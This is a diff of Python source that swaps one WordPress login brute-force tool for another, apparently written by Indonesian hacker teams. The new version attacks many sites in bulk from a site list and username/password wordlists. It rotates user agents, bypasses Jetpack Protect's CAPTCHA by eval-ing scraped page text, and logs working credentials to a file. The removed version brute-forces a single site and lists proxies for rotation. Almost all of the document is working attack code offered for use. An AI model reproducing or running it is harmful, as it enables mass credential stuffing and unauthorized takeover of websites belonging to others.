@@ -1,104 +1,109 @@
-import os
-import sys
-import random
-import requests
-R = '\033[31m'   # Red
-N = '\033[1;37m' # White
-G = '\033[32m'   # Green
-O = '\033[0;33m' # Orange
-B = '\033[1;34m' # Blue
-C = '\033[36m' # cyan
-def banner():
-	print ("""
-\033[1;34m
- _______ ______    _________
-        |              
-       / \
-      / _ \
-     |.o '.|
-     |'._.'|
-     |     |
-   ,'|  |  |`.
-  /  |  |  |  \
-  |,-'--|--'-.| l42
+# -*- coding: utf8 -*-
+#Ya Maap codingan we berantakan :'v,jangan di recode ya KONTOL.
 
-Codename : \033[32mWPBrute~X
-\033[1;34mCoded BY : \033[32mKyuRazz ~ Family Attack Cyber
-\033[1;34mVersion  : \033[32m1.0
-Thanks To : Dann ~ Aalex ~ Faisal ~ Ago Oeng 
+import requests,readline,re,os,random
+from urllib.request import urlsplit
+requests = requests.Session()
 
-    """)
-
-class a:
-
-	def __init__(self):
-		self.username = input("  [\033[36m*\033[32m] Username => ")
-		self.password = input("  [\033[36m*\033[32m] File Password => ")
-		self.code = ('jtc')
-		self.url = input("  [\033[36m*\033[32m] Your URL => ")
-		self.headers = {'User-Agent':'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414',
-					   'Accept': 'application/x-www-form-urlencoded',
-					   'Cookie': 'wordpress_test_cookie=WP Cookie check'
-
-					   }
-		
-		self.proxi = [
-'http://78.160.160.70',
-'http://95.239.10.204',
-'http://205.202.42.230',
-'http://186.148.168.91',
-'http://113.252.222.73',
-'http://203.107.135.125',
-'http://80.48.119.28',
-'http://159.203.20.110',
-'http://178.128.153.253',
-'http://104.248.123.136',
-'http://157.230.149.54'
-
-   
-]
-
-	def brute(self):
-		self.nani = open(self.password, 'r').readlines()
-		self.mani = open(self.password, 'r').readlines()
-		self.testing = requests.get(self.url).text
-		self.random = random.choice(self.proxi)
-		ha = {'http':self.random}
-		try:
-			if 'Hover or click the text box below' in self.testing:
-				print ("  [\033[36m*\033[32m] ADA PERTANYAAN GAN [\033[36m*\033[32m]")
-				for i in self.nani:
-					yeah = i.strip()
-					self.datadata = {'log':self.username,'pwd':yeah,'reference':self.code}
-					jebol = requests.post(self.url, data=self.datadata, headers=self.headers)
-					hetset = (jebol).text
-					if 'Dashboard' in hetset:
-						print("\033[32m[SUKSES] {}" .format(yeah))
-					else:
-						print("\033[GAGAL] [31m{}" .format(yeah))
-			else:
-				print("  [\033[36m*\033[32m] NO ANSWER [\033[36m*\033[32m]")
-				for z in self.mani:
-					yeahmen = z.strip()
-					self.datadata = {'log':self.username,'pwd':yeahmen}
-					jebol = requests.post(self.url, data=self.datadata, headers=self.headers)
-					kento = (jebol).text
-					if 'Dashboard' in kento:
-						print("\033[32m[SUKSES] \033[32m{} ".format(yeahmen))
-					else:
-						print("\033[31m[GAGAL] {}" .format(yeahmen) )
-
-		except KeyboardInterrupt:
-			print ("CTRL+C")
+h = '\033[92m'
+p = '\033[97m'
+m = '\033[91m'
+br = '\033[94m'
+ua = open('ua.txt','rb').read().decode('utf8').splitlines()
 
 
+__banner__ = ('''
+      
+      ██████╗ ███████╗ ██████╗ ██╗  ██╗████████╗    
+      ██╔══██╗╚════██║██╔═████╗██║  ██║╚══██╔══╝    
+      ██║  ██║    ██╔╝██║██╔██║███████║   ██║       
+      ██║  ██║   ██╔╝ ████╔╝██║╚════██║   ██║       
+      ██████╔╝   ██║  ╚██████╔╝     ██║   ██║       
+      ╚═════╝    ╚═╝   ╚═════╝      ╚═╝   ╚═╝       
+      
+     
+
+[+] WordPress Massal Brute Force..
+[+] Author : Jay Hutajulu a.k.a ./BarBarKing
+[+] Team: D704T HackerTeam Ft MedanHackingRulez 
+''')
+
+class Main():
+    def __init__(self):
+        os.system('clear')
+        print(__banner__)
+        self.v = 0
+        self.sendu()
+        self.u_p()
+        self.crack()
+
+    def sendu(self):
+        try:
+            print('\n%s[info]%s Masukkan File list site nya.!!' % (h,p))
+            f = str(input('%s[info] %slist site: ' % (h,p)))
+            self.site = open(f,'rb').read().decode('utf8').splitlines()
+        except Exception as _er:
+            quit('%s[info]%s%s' % (m,p,_er))
+
+    def u_p(self):
+        try:
+            print('%s[info]%s Masukkan WordList' % (h,p))
+            us = str(input('%s[info]%s list user: ' % (br,p)))
+            pw = str(input('%s[info]%s list pasw: ' % (br,p)))
+            self.a = open(us,'rb').read().decode('latin').splitlines()
+            self.b = open(pw,'rb').read().decode('latin').splitlines()
+        except Exception as _er:
+            quit('%s[info]%s%s' % (m,p,_er))
+
+    def crack(self):
+        print('%s[info]%s total site: %d' % (h,p,len(self.site)))
+        print('%s[info]%s total wordlist u/p: %d' % (h,p,min([len(self.a),len(self.b)])))
+        for site in self.site:
+                requests.headers.update({'user-agent':random.choice(ua)})
+                parse = urlsplit(site)
+                netloc = parse.netloc
+                scheme = parse.scheme
+                print('%s[info]%s cracking: %s' % (br,p,netloc))
+                for a,b in zip(self.a,self.b):
+                    try:
+                        data = {}
+                        url = '%s://%s/wp-login.php' % (scheme,netloc)
+                        cek = requests.get(url)
+                        if cek.status_code != 200:
+                           print('%s[info]%s path wp-login not found ' % (m,p))
+                           continue
+                        for c,d in re.findall(r'name="(.*?)".*?value="(.*?)"',cek.text):
+                           data.update({c:d})
+                        if 'jetpack_protect_num' in cek.text.lower():
+                            info = re.findall(r'\n\t\t\t\t\t(.*?)=.*?\t\t\t\t',cek.text)[0].split(' ')
+                            iok = (''.join(info)).replace('x','*').replace('&nbsp;','')
+                            value = str(eval(iok))
+                            print('%s[info]%s user agent di curigai' % (m,p))
+                            print('%s[info]%s bypassin chapta :"v %s = %s%s'  % (m,p,iok,h,value))
+                            data.update({'jetpack_protect_num':value})
+                        else:
+                            pass
+                        data.update({'log':a,'pwd':b})
+                        req = requests.post(url,
+                            data = data
+                            ).text.lower()
+                        if 'dashboard' in req:
+                            self.v += 1
+                            print('    %s~ found%s: %s > %s , %s' %(h,p,url,a,b))
+                            open('found.txt','a').write(url+'>  %s | %s \n' % (a,b))
+                            break
+                        else:
+                            print('    %s~ failed login %s%s , %s' % (m,p,a,b))
+                        continue
+                    except:
+                        print('%s[info] %sError gan ..' % (m,p))
+                        continue
+        quit('%s[%s@%s]%s selesai total %s save to found.txt' % (br,m,br,p,self.v))
 
 
 
-		
 
-if __name__ == "__main__":
-	os.system('clear')
-	banner()
-	mi = a()
-	mi.brute()
+
+
+#___main___:
+Main()
